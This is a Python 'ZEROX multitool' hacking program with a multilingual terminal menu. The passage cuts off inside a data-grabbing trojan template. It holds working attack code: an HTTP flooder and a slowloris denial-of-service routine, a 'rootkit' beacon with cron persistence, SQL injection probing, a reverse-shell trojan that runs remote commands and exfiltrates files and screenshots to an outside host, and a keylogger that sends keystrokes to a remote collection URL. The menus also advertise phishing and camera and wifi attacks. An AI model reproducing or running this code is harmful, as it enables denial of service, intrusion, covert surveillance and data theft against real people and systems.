#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  Z E R O X  ::  multitool
  created by injectorX 69

  pip install requests
  optional: pip install scapy phonenumbers pynput pillow pyinstaller   +   adb
  run:                 python zerox.py
  bez animace:         python zerox.py --plain
  animace i mimo tty:  python zerox.py --anim
  selftest:            python zerox.py --selftest
"""

import os
import io
import sys
import re
import math
import json
import time
import struct
import base64
import random
import shutil
import socket
import ssl
import queue
import select
import threading
import subprocess
import webbrowser
import http.server
import urllib.parse
import contextlib
import traceback
from datetime import datetime

PLAIN = ("--plain" in sys.argv) or (not sys.stdin.isatty()) or (not sys.stdout.isatty())
if "--anim" in sys.argv:
    PLAIN = False

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    subprocess.call([sys.executable, "-m", "pip", "install", "requests"])
    import requests
    requests.packages.urllib3.disable_warnings()

# ══════════════════════════════════════════════════ ANSI
R, BOLD = "\033[0m", "\033[1m"
W, CY, YL, GN, RD, GR, MG = "\033[97m", "\033[96m", "\033[93m", "\033[92m", "\033[91m", "\033[90m", "\033[95m"
BG = "\033[48;5;232m"
ACC = "\033[38;5;178m"
HI = "\033[38;5;221m"
DIMC = "\033[38;5;94m"

MONEY = "$$$$$$$$$$€€€£¥₿¢¤"

# 10stupňový zlatý gradient (0 = dohasínající, 9 = hlava)
GOLD = ["\033[38;5;58m", "\033[38;5;94m", "\033[38;5;136m", "\033[38;5;178m",
        "\033[38;5;214m", "\033[38;5;220m", "\033[38;5;226m", "\033[38;5;228m",
        "\033[38;5;229m", "\033[38;5;231m"]
GREEN = ["\033[38;5;22m", "\033[38;5;28m", "\033[38;5;34m", "\033[38;5;40m",
         "\033[38;5;46m", "\033[38;5;82m", "\033[38;5;118m", "\033[38;5;154m",
         "\033[38;5;190m", "\033[38;5;231m"]

UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) ZEROX/8.0"}

# srovnaný ANSI-shadow banner (všechny řádky stejná šířka)
ART = [
"oooooooooo  oooooooooooo  ooooooooo.      .oooooo.    ooooooo   ooooo  ",
"d'\"\"\"\"\"\"d888'  `888'     `8  `888   `Y88.  d8P'  `Y8b   `8888    d8'   ",
"      .888P     888           888   .d88'  888      888    Y888..8P     ",
"     d888'      888oooo8      888ooo88P'   888      888     `8888'      ",
"   .888P        888    \"      888`88b.     888      888    .8PY888.     ",
"  d888'    .P   888       o   888  `88b.   `88b    d88'   d8'  `888b    ",
".8888888888P   o888ooooood8  o888o  o888o   `Y8bood8P'   o888o  o88888o ",
]
AW = max(len(l) for l in ART)

SMALL = [
 " ███████╗███████╗██████╗  ██████╗ ██╗  ██╗",
 " ██╔════╝██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝",
 " ███████╗█████╗  ██████╔╝██║   ██║ ╚███╔╝ ",
 " ╚════██║██╔══╝  ██╔══██╗██║   ██║ ██╔██╗ ",
 " ███████║███████╗██║  ██║╚██████╔╝██╔╝ ██╗",
 " ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝",
]

# ══════════════════════════════════════════════════ i18n
LANG = "en"
T = {
"en": {"pick":"SELECT LANGUAGE","main":"MAIN MENU","m1":"HACK","m2":"OSINT","m0":"EXIT",
 "hack":"HACK MENU","h1":"DDOS flood","h2":"DOS slowloris","h3":"DDOS + rootkit","h4":"SQL injection",
 "h5":"Trojan factory","h6":"Inject trojan","h7":"Trojan goat - data grab","h8":"Web hack","h9":"Kill web","h10":"back",
 "osint":"OSINT MENU","o1":"Phone number trace","o2":"IP tracer","o3":"Name tracer","o4":"ID lookup",
 "o5":"Phishing site builder","o6":"Cam hack","o7":"Phone hack (adb)","o8":"Hack camera (wifi)","o9":"Kill wifi (deauth)","o10":"back",
 "choice":"choice","langkey":"L language","bye":"ZEROX down","keys":"number + ENTER","back":"back",
 "url":"target URL","host":"host / IP","threads":"threads","secs":"seconds","ip":"IP address",
 "phone":"phone number","name":"name / nick","ident":"ID / username / email","port":"port","subnet":"subnet",
 "enter":"ENTER to continue","start":"starting","done":"done","stats":"requests","err":"errors","none":"nothing found",
 "saved":"saved to","missing":"missing dependency","loading":"LOADING"},
"cs": {"pick":"VYBER JAZYK","main":"HLAVNÍ MENU","m1":"HACK","m2":"OSINT","m0":"EXIT",
 "hack":"HACK MENU","h1":"DDOS flood","h2":"DOS slowloris","h3":"DDOS + rootkit","h4":"SQL injection",
 "h5":"Továrna na trojany","h6":"Inject trojan","h7":"Trojan goat - data grab","h8":"Web hack","h9":"Kill web","h10":"zpět",
 "osint":"OSINT MENU","o1":"Trace čísla","o2":"IP tracer","o3":"Trace jména","o4":"ID lookup",
 "o5":"Phishing builder","o6":"Cam hack","o7":"Phone hack (adb)","o8":"Hack kamery","o9":"Kill wifi","o10":"zpět",
 "choice":"volba","langkey":"L jazyk","bye":"ZEROX končí","keys":"číslo + ENTER","back":"zpět",
 "url":"cílová URL","host":"host / IP","threads":"vlákna","secs":"sekundy","ip":"IP adresa",
 "phone":"telefonní číslo","name":"jméno","ident":"ID / username / e-mail","port":"port","subnet":"subnet",
 "enter":"ENTER pro pokračování","start":"startuji","done":"hotovo","stats":"požadavků","err":"chyb","none":"nic nenalezeno",
 "saved":"uloženo do","missing":"chybí závislost","loading":"NAČÍTÁM"},
"ru": {"pick":"ВЫБЕРИ ЯЗЫК","main":"ГЛАВНОЕ МЕНЮ","m1":"HACK","m2":"OSINT","m0":"ВЫХОД",
 "hack":"МЕНЮ HACK","h1":"DDOS","h2":"DOS","h3":"DDOS + руткит","h4":"SQL инъекция",
 "h5":"Фабрика троянов","h6":"Внедрить троян","h7":"Троян-сборщик","h8":"Web hack","h9":"Kill web","h10":"назад",
 "osint":"МЕНЮ OSINT","o1":"Трассировка","o2":"IP tracer","o3":"Поиск по имени","o4":"ID lookup",
 "o5":"Фишинг","o6":"Cam hack","o7":"Phone hack","o8":"Камеры","o9":"Kill wifi","o10":"назад",
 "choice":"выбор","langkey":"L язык","bye":"ZEROX выключен","keys":"число + ENTER","back":"назад",
 "url":"URL","host":"хост / IP","threads":"потоки","secs":"секунды","ip":"IP",
 "phone":"номер","name":"имя","ident":"ID","port":"порт","subnet":"подсеть",
 "enter":"ENTER","start":"запуск","done":"готово","stats":"запросов","err":"ошибок","none":"ничего",
 "saved":"сохранено","missing":"нет зависимости","loading":"ЗАГРУЗКА"},
"pl": {"pick":"WYBIERZ JĘZYK","main":"MENU GŁÓWNE","m1":"HACK","m2":"OSINT","m0":"EXIT",
 "hack":"MENU HACK","h1":"DDOS","h2":"DOS","h3":"DDOS + rootkit","h4":"SQL injection",
 "h5":"Fabryka trojanów","h6":"Wstrzyknij trojana","h7":"Trojan zbieracz","h8":"Web hack","h9":"Kill web","h10":"wstecz",
 "osint":"MENU OSINT","o1":"Namierz numer","o2":"IP tracer","o3":"Szukaj po imieniu","o4":"ID lookup",
 "o5":"Phishing","o6":"Cam hack","o7":"Phone hack","o8":"Kamery","o9":"Kill wifi","o10":"wstecz",
 "choice":"wybór","langkey":"L język","bye":"ZEROX wyłączony","keys":"numer + ENTER","back":"wstecz",
 "url":"URL","host":"host / IP","threads":"wątki","secs":"sekundy","ip":"IP",
 "phone":"numer","name":"imię","ident":"ID","port":"port","subnet":"podsieć",
 "enter":"ENTER","start":"start","done":"gotowe","stats":"żądań","err":"błędów","none":"nic",
 "saved":"zapisano","missing":"brak zależności","loading":"ŁADOWANIE"},
"de": {"pick":"SPRACHE WÄHLEN","main":"HAUPTMENÜ","m1":"HACK","m2":"OSINT","m0":"EXIT",
 "hack":"HACK-MENÜ","h1":"DDOS","h2":"DOS","h3":"DDOS + Rootkit","h4":"SQL Injection",
 "h5":"Trojan-Fabrik","h6":"Trojan injizieren","h7":"Trojan Goat","h8":"Web Hack","h9":"Kill Web","h10":"zurück",
 "osint":"OSINT-MENÜ","o1":"Nummer tracen","o2":"IP Tracer","o3":"Namens-Trace","o4":"ID Lookup",
 "o5":"Phishing","o6":"Cam Hack","o7":"Phone Hack","o8":"Kameras","o9":"Kill Wifi","o10":"zurück",
 "choice":"Auswahl","langkey":"L Sprache","bye":"ZEROX beendet","keys":"Zahl + ENTER","back":"zurück",
 "url":"URL","host":"Host / IP","threads":"Threads","secs":"Sekunden","ip":"IP",
 "phone":"Nummer","name":"Name","ident":"ID","port":"Port","subnet":"Subnetz",
 "enter":"ENTER","start":"starte","done":"fertig","stats":"Requests","err":"Fehler","none":"nichts",
 "saved":"gespeichert","missing":"fehlende Abhängigkeit","loading":"LADE"},
}

def t(k):
    return T.get(LANG, T["en"]).get(k, T["en"].get(k, k))

# ══════════════════════════════════════════════════ stav
W_, H_ = 100, 30
TITLE, STATUS, PROMPT = "", "", ""
LOG = []
MENU = None          # None = command screen, list = menu screen
M = None
FRAME = 1.0 / 24
_tick_n = 0

def size():
    global W_, H_
    s = shutil.get_terminal_size((110, 34))
    W_ = max(60, s.columns - 1)
    H_ = max(20, s.lines)
    return W_, H_

def log(s="", col=W):
    s = str(s)
    if PLAIN:
        print(col + "  " + s + R)
        return
    LOG.append((s, col))
    if len(LOG) > 400:
        del LOG[0]

def ok(m):   log("✔ " + str(m), GN)
def bad(m):  log("✖ " + str(m), RD)
def info(m): log("▸ " + str(m), YL)

def set_status(s):
    global STATUS
    STATUS = s

# ══════════════════════════════════════════════════ peníze
class Money:
    __slots__ = ("w", "h", "ch", "br", "dr", "sp", "th", "tick")

    def __init__(self, w, h):
        self.w, self.h = w, h
        self.ch = [[" "] * w for _ in range(h)]
        self.br = [[0] * w for _ in range(h)]
        self.dr = [random.randint(-h, 0) for _ in range(w)]
        self.sp = [random.randint(1, 3) for _ in range(w)]
        self.th = [random.random() < 0.7 for _ in range(w)]
        self.tick = 0

    def step(self):
        self.tick += 1
        for row in self.br:
            for x, v in enumerate(row):
                if v:
                    row[x] = v - 1
        for x in range(self.w):
            if self.tick % self.sp[x] == 0:
                self.dr[x] += 1
            y = self.dr[x]
            if 0 <= y < self.h:
                self.ch[y][x] = random.choice(MONEY)
                self.br[y][x] = 9
                if y > 0 and self.br[y - 1][x] < 6:
                    self.br[y - 1][x] = 6
            if y > self.h + 8 and random.random() < 0.18:
                self.dr[x] = random.randint(-self.h, -2)
                self.sp[x] = random.randint(1, 3)
                self.th[x] = random.random() < 0.7

def shade(x, b):
    return (GOLD if M.th[x] else GREEN)[b if b < 9 else 9]

def put(ov, x, y, txt, col):
    for i, c in enumerate(txt):
        if 0 <= x + i < W_ and 0 <= y < H_:
            ov[(x + i, y)] = (c, col)

def draw_art(ov, y0, phase):
    art = ART if W_ >= AW + 2 else SMALL
    aw = max(len(l) for l in art)
    x0 = max(0, (W_ - aw) // 2)
    sigma = 8.0
    for y, line in enumerate(art):
        for x, ch in enumerate(line):
            if ch == " ":
                continue
            d = abs(x - phase)
            d = min(d, abs(x - phase + aw), abs(x - phase - aw))
            k = math.exp(-(d * d) / (2 * sigma * sigma))
            col = GOLD[min(int(k * 9), 9)]
            if k > 0.94 and random.random() < 0.2:
                col = BOLD + W
            put(ov, x0 + x, y0 + y, ch, col)

def draw_frame(m, ov):
    parts = ["\033[?2026h\033[H"]
    for y in range(m.h):
        last = None
        parts.append(BG)
        for x in range(m.w):
            cell = ov.get((x, y))
            if cell is not None:
                ch, col = cell
            else:
                b = m.br[y][x]
                ch, col = (m.ch[y][x], shade(x, b)) if b else (" ", GOLD[0])
            if col != last:
                parts.append(col)
                last = col
            parts.append(ch)
        parts.append(R)
        if y < m.h - 1:
            parts.append("\r\n")
    parts.append("\033[?2026l")
    sys.stdout.write("".join(parts))
    sys.stdout.flush()

def build_screen(ov, w, h, buf):
    y = 0
    art = ART if w >= AW + 2 else (SMALL if w >= 26 else None)
    if art:
        draw_art(ov, 0, (time.time() * 60) % (AW + 70))
        y = len(art) + 1

    if MENU is not None:
        pw = max([len(k) + len(l) + 8 for k, l in MENU] + [len(TITLE) + 8, 30])
        pw = min(pw, w - 6)
        ph = len(MENU) + 4
        px = max(2, (w - pw) // 2)
        py = y + max(1, (h - y - ph - 4) // 2)
        put(ov, px, py, "╭" + "─" * (pw - 2) + "╮", ACC)
        put(ov, px + max(2, (pw - len(TITLE) - 2) // 2), py, " " + TITLE + " ", BOLD + HI)
        for i, (key, label) in enumerate(MENU):
            row = py + 2 + i
            put(ov, px, row, "│", ACC)
            put(ov, px + pw - 1, row, "│", ACC)
            put(ov, px + 3, row, key, HI)
            put(ov, px + 3 + len(key) + 1, row, label[:pw - len(key) - 8], W)
        put(ov, px, py + ph - 1, "╰" + "─" * (pw - 2) + "╯", ACC)
        foot = f"{t('keys')}   ·   {t('langkey')}   ·   0 {t('back')}"
        put(ov, max(2, (w - len(foot)) // 2), py + ph + 1, foot, DIMC)
        put(ov, px + 3, py + ph - 1, "", ACC)
        put(ov, px + 2, py + ph + 2, "▶ " + PROMPT + " : " + buf + "▊", W)
        if STATUS:
            put(ov, max(2, (w - len(STATUS)) // 2), py + ph + 3, STATUS, HI)
        return

    # command screen: hlavička + gutter, žádný velký rám
    put(ov, 2, y, "╭─ " + TITLE[:w - 8] + " ", ACC)
    put(ov, w - 4, y, "──╮", ACC)
    top = y + 1
    room = h - top - 4
    rows = LOG[-room:] if room > 0 else []
    for i, (s, c) in enumerate(rows):
        put(ov, 2, top + i, "│", ACC)
        put(ov, 4, top + i, s[:w - 7], c)
    if STATUS:
        put(ov, 2, h - 3, "│", ACC)
        put(ov, 4, h - 3, STATUS[:w - 7], HI)
    put(ov, 2, h - 2, "╰─▶ " + PROMPT + " : " + buf + "▊", W)

# ══════════════════════════════════════════════════ vstup
@contextlib.contextmanager
def raw():
    if os.name == "nt" or PLAIN:
        yield
        return
    import termios
    import tty
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    tty.setraw(fd)
    try:
        yield
    finally:
        with contextlib.suppress(Exception):
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

def readkey(timeout=0.01):
    timeout = max(timeout, 0.001)
    if os.name == "nt":
        import msvcrt
        end = time.time() + timeout
        while True:
            if msvcrt.kbhit():
                ch = msvcrt.getwch()
                if ch in ("\x00", "\xe0"):
                    msvcrt.getwch()
                    return "\x1b"
                return ch
            if time.time() >= end:
                return None
            time.sleep(0.005)
    r, _, _ = select.select([sys.stdin], [], [], timeout)
    if not r:
        return None
    return os.read(sys.stdin.fileno(), 1).decode("utf-8", "ignore")

def tick():
    global M, _tick_n
    _tick_n += 1
    if M is None or _tick_n % 8 == 0:
        w, h = size()
        if M is None or M.w != w or M.h != h:
            M = Money(w, h)
    M.step()

def input_line(prompt, default=""):
    if PLAIN:
        try:
            return input("  " + prompt + ": ").strip() or default
        except EOFError:
            return default
    try:
        return _input_tui(prompt, default)
    except (OSError, IOError, ValueError):
        try:
            return input("  " + prompt + ": ").strip() or default
        except EOFError:
            return default

def _input_tui(prompt, default=""):
    global PROMPT
    PROMPT = prompt
    buf, skip = "", 0
    nxt = time.time()
    with raw():
        while True:
            tick()
            ov = {}
            build_screen(ov, W_, H_, buf)
            draw_frame(M, ov)
            k = readkey(0.004)
            if k is None:
                nxt += FRAME
                d = nxt - time.time()
                if d > 0:
                    time.sleep(d)
                else:
                    nxt = time.time()
                continue
            if skip:
                skip -= 1
                continue
            if k in ("\r", "\n"):
                return buf.strip() or default
            if k == "\x03":
                raise KeyboardInterrupt
            if k in ("\x7f", "\x08"):
                buf = buf[:-1]
                continue
            if k == "\x1b":
                buf, skip = "", 2
                continue
            if k.isprintable():
                buf += k

def ask(msg, default=""):
    return input_line(msg, default)

def wait_enter():
    input_line(t("enter"))

def screen(title, lines=()):
    global TITLE, MENU
    TITLE = title
    MENU = None
    LOG.clear()
    set_status("")
    if PLAIN:
        print("\n" + HI + "─" * 60 + R)
        print(BOLD + HI + "  " + title + R)
        print(HI + "─" * 60 + R)
        for l in lines:
            print("  " + (l if isinstance(l, str) else l[0]))
        return
    for l in lines:
        log(l) if isinstance(l, str) else log(*l)

def screen_menu(title, items):
    global TITLE, MENU
    TITLE = title
    MENU = items
    LOG.clear()
    set_status("")
    if PLAIN:
        print("\n" + HI + "─" * 60 + R)
        print(BOLD + HI + "  " + title + R)
        print(HI + "─" * 60 + R)
        for k, l in items:
            print(f"  {k}  {l}")
        print("  " + t("keys"))

def guard(fn):
    def wrap():
        try:
            fn()
        except KeyboardInterrupt:
            log("přerušeno", YL)
            wait_enter()
        except Exception:
            bad(traceback.format_exc(limit=3).replace("\n", " ")[:300])
            wait_enter()
    return wrap

# ══════════════════════════════════════════════════ utils
def ensure_url(u):
    return u if re.match(r"^https?://", u, re.I) else "http://" + u

def host_of(u):
    return urllib.parse.urlparse(ensure_url(u)).netloc

def lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def outdir(name):
    d = os.path.join(os.getcwd(), "zerox_out", name)
    os.makedirs(d, exist_ok=True)
    return d

def save(name, data):
    p = os.path.join(outdir(datetime.now().strftime("%Y%m%d_%H%M%S")), name)
    with open(p, "w", encoding="utf-8", errors="ignore") as f:
        f.write(data)
    ok(t("saved") + ": " + p)
    return p

def verify_src(src, label):
    try:
        compile(src, label, "exec")
        return True
    except SyntaxError as e:
        bad(f"{label}: syntax error line {e.lineno}: {e.msg}")
        return False

# ══════════════════════════════════════════════════ boot
def boot():
    global TITLE, MENU
    TITLE, MENU = "", None
    LOG.clear()
    if PLAIN:
        print(GN + "\n  ZEROX  ::  created by injectorX 69\n" + R)
        return
    t0, dur = time.time(), 2.8
    while time.time() - t0 < dur:
        tick()
        p = (time.time() - t0) / dur
        ov = {}
        art = ART if W_ >= AW + 2 else SMALL
        ay = max(1, H_ // 2 - len(art) // 2 - 1)
        draw_art(ov, ay, (p * 3.4) * (AW + 40) % (AW + 70))
        put(ov, max(0, (W_ - 22) // 2), ay + len(art), "created by injectorX 69", HI)
        bw = min(W_ - 10, 40)
        bx = (W_ - bw) // 2
        fill = int((bw - 4) * p)
        put(ov, bx, ay + len(art) + 2, "▕" + "█" * fill + "░" * (bw - 4 - fill) + "▏", HI)
        put(ov, bx + bw // 2 - 7, ay + len(art) + 3, f"{t('loading')} {int(p*100)}%", ACC)
        draw_frame(M, ov)
        time.sleep(FRAME)

def pick_language():
    global LANG
    codes = {"1": "en", "2": "cs", "3": "ru", "4": "pl", "5": "de"}
    screen_menu(t("pick"), [("1", "English"), ("2", "Čeština"), ("3", "Русский"),
                            ("4", "Polski"), ("5", "Deutsch")])
    LANG = codes.get(input_line("1-5", "1"), "en")
    ok(LANG)

# ══════════════════════════════════════════════════ DDOS / DOS
class Flooder:
    def __init__(self, url, threads, secs):
        self.url, self.n, self.s = ensure_url(url), max(1, threads), max(1, secs)
        self.ok = self.er = 0
        self.stop_at = time.time() + self.s
        self.lk = threading.Lock()

    def _w(self):
        s = requests.Session()
        while time.time() < self.stop_at:
            try:
                s.get(self.url, headers=UA, timeout=6, verify=False)
                with self.lk: self.ok += 1
            except Exception:
                with self.lk: self.er += 1

    def _rep(self):
        while time.time() < self.stop_at:
            with self.lk: o, e = self.ok, self.er
            set_status(f"{t('stats')}: {o}   {t('err')}: {e}   {max(0, int(self.stop_at - time.time()))}s")
            time.sleep(0.3)
        set_status("")

    def run(self):
        info(f"{t('start')} ▸ {self.url} ({self.n} {t('threads')} / {self.s}s)")
        th = [threading.Thread(target=self._w, daemon=True) for _ in range(self.n)]
        threading.Thread(target=self._rep, daemon=True).start()
        for x in th:
            x.start()
        while time.time() < self.stop_at:
            time.sleep(0.15)
        time.sleep(0.4)
        ok(f"{t('done')} ▸ {self.ok} ok / {self.er} err")

@guard
def cmd_ddos():
    screen(t("h1"))
    u = ask(t("url"))
    if not u:
        return
    Flooder(u, int(ask(t("threads"), "80") or 80), int(ask(t("secs"), "30") or 30)).run()
    wait_enter()

def slow_dos(url, n=120, secs=30):
    p = urllib.parse.urlparse(ensure_url(url))
    host, port = p.hostname, p.port or (443 if p.scheme == "https" else 80)
    stop_at, socks = time.time() + secs, []
    info(f"slowloris ▸ {host}:{port} ({n} sockets / {secs}s)")
    try:
        for _ in range(n):
            try:
                s = socket.create_connection((host, port), timeout=6)
                if p.scheme == "https":
                    s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
                s.send(f"GET /{random.randint(1,99999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ZEROX\r\n".encode())
                socks.append(s)
            except Exception:
                pass
        ok(f"{len(socks)} sockets open")
        k = 0
        while time.time() < stop_at:
            for s in list(socks):
                try:
                    s.send(f"X-b: {random.randint(1,9999)}\r\n".encode())
                    k += 1
                except Exception:
                    socks.remove(s)
            set_status(f"keep-alive: {k}   open: {len(socks)}")
            time.sleep(2)
        set_status("")
        ok(f"{t('done')} ▸ {k} keep-alive")
    finally:
        for s in socks:
            with contextlib.suppress(Exception):
                s.close()

@guard
def cmd_dos():
    screen(t("h2"))
    u = ask(t("url"))
    if not u:
        return
    slow_dos(u, int(ask("sockets", "120") or 120), int(ask(t("secs"), "30") or 30))
    wait_enter()

def install_rootkit(url):
    base = os.path.join(os.path.expanduser("~"), ".zerox")
    os.makedirs(base, exist_ok=True)
    beacon = os.path.join(base, "beacon.py")
    with open(beacon, "w") as f:
        f.write("import time,requests\nT='%s'\nwhile True:\n"
                " try: requests.get(T,timeout=10)\n except Exception: pass\n time.sleep(60)\n" % ensure_url(url))
    launcher = os.path.join(base, "run.sh")
    with open(launcher, "w") as f:
        f.write(f"#!/bin/sh\nnohup {sys.executable} {beacon} >/dev/null 2>&1 &\n")
    os.chmod(launcher, 0o755)
    ok("rootkit stub ▸ " + base)
    if os.name != "nt":
        with contextlib.suppress(Exception):
            cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
            if "zerox/run.sh" not in cur:
                new = (cur.rstrip() + f"\n@reboot {launcher}\n").lstrip("\n")
                if subprocess.run(["crontab", "-"], input=new, text=True, capture_output=True).returncode == 0:
                    ok("persistence ▸ @reboot cron")
    subprocess.Popen([sys.executable, beacon], stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL, start_new_session=True)
    ok("beacon running")

@guard
def cmd_ddos_rootkit():
    screen(t("h3"))
    u = ask(t("url"))
    if not u:
        return
    install_rootkit(u)
    Flooder(u, 100, 25).run()
    wait_enter()

# ══════════════════════════════════════════════════ SQLi
PAY = ["'", "\"", "' OR '1'='1", "1' AND 1=1-- -", "') OR ('1'='1", "1 AND SLEEP(3)-- -"]
ERRS = ["sql syntax", "mysql_fetch", "you have an error in your sql", "ora-0", "postgresql",
        "sqlite", "unclosed quotation", "quoted string not properly terminated", "warning: mysqli"]

@guard
def cmd_sqli():
    screen(t("h4"))
    u = ask(t("url"))
    if not u:
        return
    u = ensure_url(u)
    p = urllib.parse.urlparse(u)
    if not p.query:
        bad("URL needs parameters (?id=1)")
        wait_enter()
        return
    prm = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    key = prm[0][0]
    info("parameter ▸ " + key)
    base = requests.get(u, headers=UA, timeout=10, verify=False)
    found = []
    for pl in PAY:
        q = [(k, pl if k == key else v) for k, v in prm]
        try:
            r = requests.get(p._replace(query=urllib.parse.urlencode(q)).geturl(),
                             headers=UA, timeout=15, verify=False)
        except Exception:
            continue
        hit = [e for e in ERRS if e in r.text.lower()]
        if hit:
            ok(f"VULN ▸ {pl!r} → {hit[0]}")
            found.append((pl, hit[0]))
        elif abs(len(r.text) - len(base.text)) > 40:
            info(f"possible ▸ {pl!r} → diff {len(r.text)-len(base.text)}")
            found.append((pl, "len diff"))
    if found:
        save("sqli.txt", "\n".join(f"{a} → {b}" for a, b in found))
    else:
        bad(t("none"))
    wait_enter()

# ══════════════════════════════════════════════════ TROJAN šablony
COMMON = r'''
import socket, struct, os, sys, subprocess, time, json, base64, platform, getpass
import threading, io, random, glob, urllib.request, urllib.parse, zipfile, tempfile, contextlib

def pack(tag, data=b""):
    if isinstance(data, str):
        data = data.encode(errors="ignore")
    return tag + struct.pack(">I", len(data)) + data

def sendall(sk, tag, data=b""):
    sk.sendall(pack(tag, data))

def recvmsg(sk):
    hdr = b""
    while len(hdr) < 5:
        c = sk.recv(5 - len(hdr))
        if not c:
            return None, b""
        hdr += c
    tag, ln = hdr[:1], struct.unpack(">I", hdr[1:])[0]
    body = b""
    while len(body) < ln:
        c = sk.recv(min(65536, ln - len(body)))
        if not c:
            break
        body += c
    return tag, body
'''

PERSIST = r'''
def persist():
    try:
        if os.name == "nt":
            import winreg
            cmd = sys.executable if getattr(sys, "frozen", False) else '"%s" "%s"' % (sys.executable, os.path.abspath(__file__))
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "ZeroX", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(k)
        else:
            cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
            if "ZEROX" not in cur:
                line = "@reboot nohup %s %s >/dev/null 2>&1 #ZEROX" % (sys.executable, os.path.abspath(__file__))
                subprocess.run(["crontab", "-"], input=cur.rstrip() + "\n" + line + "\n", text=True)
    except Exception:
        pass
'''

T_SHELL = COMMON + r'''
H, P, JIT = "__HOST__", __PORT__, __JIT__

''' + PERSIST + r'''
def sysinfo():
    admin = "?"
    try:
        admin = (os.geteuid() == 0) if os.name != "nt" else "?"
    except Exception:
        pass
    return json.dumps({"host": socket.gethostname(), "user": getpass.getuser(),
                       "os": platform.platform(), "arch": platform.machine(),
                       "cwd": os.getcwd(), "pid": os.getpid(), "py": sys.version.split()[0],
                       "admin": admin})

def shot():
    try:
        from PIL import ImageGrab
        b = io.BytesIO()
        ImageGrab.grab().save(b, "PNG")
        return b.getvalue()
    except Exception:
        return b""

def handle(sk, cmd):
    c = cmd.strip()
    if c in ("ping", ""):
        sendall(sk, b"O", "pong")
        return
    if c == "sysinfo":
        sendall(sk, b"I", sysinfo())
        return
    if c == "screenshot":
        d = shot()
        sendall(sk, b"F", b"shot.png\n" + base64.b64encode(d)) if d else sendall(sk, b"E", "no PIL/display")
        return
    if c == "persist":
        persist()
        sendall(sk, b"O", "persist ok")
        return
    if c == "kill":
        sendall(sk, b"O", "bye")
        time.sleep(0.2)
        os._exit(0)
    if c.startswith("get "):
        p = c[4:].strip()
        try:
            d = open(p, "rb").read()
            sendall(sk, b"F", (os.path.basename(p) + "\n").encode() + base64.b64encode(d))
        except Exception as e:
            sendall(sk, b"E", str(e))
        return
    if c.startswith("cd "):
        try:
            os.chdir(os.path.expanduser(c[3:].strip()))
            sendall(sk, b"O", os.getcwd())
        except Exception as e:
            sendall(sk, b"E", str(e))
        return
    try:
        out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=90)
    except subprocess.CalledProcessError as e:
        out = e.output or b""
    except Exception as e:
        out = str(e).encode()
    sendall(sk, b"O", out)

def session():
    sk = socket.socket()
    sk.settimeout(30)
    sk.connect((H, P))
    sk.settimeout(None)
    try:
        name = os.environ.get("COMPUTERNAME") or os.uname().nodename
    except Exception:
        name = "host"
    sendall(sk, b"I", json.dumps({"name": name, "platform": sys.platform, "user": getpass.getuser()}))
    while True:
        tag, body = recvmsg(sk)
        if tag is None or tag == b"X":
            return
        if tag == b"C":
            handle(sk, body.decode(errors="ignore"))
        elif tag == b"P":
            head, _, b64 = body.partition(b"\n")
            try:
                open(head.decode(), "wb").write(base64.b64decode(b64))
                sendall(sk, b"O", "uploaded " + head.decode())
            except Exception as e:
                sendall(sk, b"E", str(e))

persist()
while True:
    try:
        session()
    except Exception:
        pass
    time.sleep(max(1.0, JIT + random.random() * JIT))
'''

T_KEYLOG = COMMON + r'''
URL = "__URL__"
BUF, LOCK = [], threading.Lock()
KLOG = os.path.join(os.path.expanduser("~"), ".zerox_keys.log")
WT = ""

''' + PERSIST + r'''
def flush():
    global BUF
    with LOCK:
        if not BUF:
            return
        data = "".join(BUF)
        BUF = []
    with contextlib.suppress(Exception):
        open(KLOG, "a", encoding="utf-8").write(data + "\n")
    try:
        req = urllib.request.Request(
            URL + "/collect",
            data=json.dumps({"kind": "keys", "win": WT, "host": socket.gethostname(),
                             "user": getpass.getuser(), "data": data}).encode(),
            headers={"Content-Type": "application/json", "X-Host": socket.gethostname(), "X-Kind": "keys"})
        urllib.request.urlopen(req, timeout=12)
    except Exception:
        pass

def ticker():
    while True:
        time.sleep(12)
        flush()

def titles():
    global WT
    while True:
        with contextlib.suppress(Exception):
            if os.name == "nt":
                WT = subprocess.check_output(
                    ["powershell", "-NoProfile",
                     "Get-Process | Where-Object {$_.MainWindowTitle} | Select-Object -First 1 -ExpandProperty MainWindowTitle"],
                    stderr=subprocess.DEVNULL, timeout=8).decode(errors="ignore").strip()
            else:
                WT = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"],
                                             stderr=subprocess.DEVNULL, timeout=4).decode(errors="ignore").strip()
        time.sleep(4)

def keys():
    try:
        from pynput import keyboard
    except ImportError:
        return
    def on_press(k):
        with LOCK:
            BUF.append(getattr(k, "char", "[%s]" % k))
        if len(BUF) >= 35:
            flush()
    keyboard.Listener(on_press=on_press).start()

persist()
threading.Thread(target=ticker, daemon=True).start()
threading.Thread(target=titles, daemon=True).start()
keys()
while True:
    time.sleep(1)
    if len(BUF) >= 80:
        flush()
'''

T_GRAB = COMMON + r'''
URL = "__URL__"

''' + PERSIST + r'''
def run(c):
    try:
        return subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=25).decode(errors="ignore")
    except Exception as e:
        return str(e)

def collect():
    home = os.path.expanduser("~")
